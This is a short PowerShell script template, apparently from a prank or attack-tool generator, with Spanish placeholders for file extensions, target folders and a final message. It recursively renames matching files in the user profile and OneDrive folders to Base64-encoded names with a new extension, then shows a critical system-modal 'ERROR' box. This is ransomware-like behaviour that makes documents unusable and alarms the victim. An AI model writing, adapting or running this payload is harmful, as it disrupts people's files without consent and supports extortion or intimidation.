Start-job {

$ext = {{LISTADO_EXTENSIONES}};
$final_ext = "{{EXTENSION_FINAL}}";
$user_dirs = "{{DIRECTORIOS}}";

$base_dirs = @("$Env:USERPROFILE", "$Env:OneDrive");
foreach($base in $base_dirs){
    if([string]::IsNullOrEmpty($base)){continue}
    Get-ChildItem -Path $base | ForEach-Object {
        if($_.Name -match $user_dirs){
            Get-ChildItem -Recurse -Path $_.FullName | ForEach-Object {
                if($ext.Contains($_.Extension.ToLower() )){
                    try{
                        Rename-Item -Path $_.FullName -NewName ($_.DirectoryName + "\" + ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_.Name)) -replace "=","") + $final_ext);
                    }catch{}
                }
            }
        }
    };
}
Add-Type -AssemblyName Microsoft.VisualBasic;[Microsoft.VisualBasic.Interaction]::MsgBox("{{MENSAJE_FINAL}}",'OKOnly,SystemModal,Critical', 'ERROR') *> $null;

} | Wait-Job
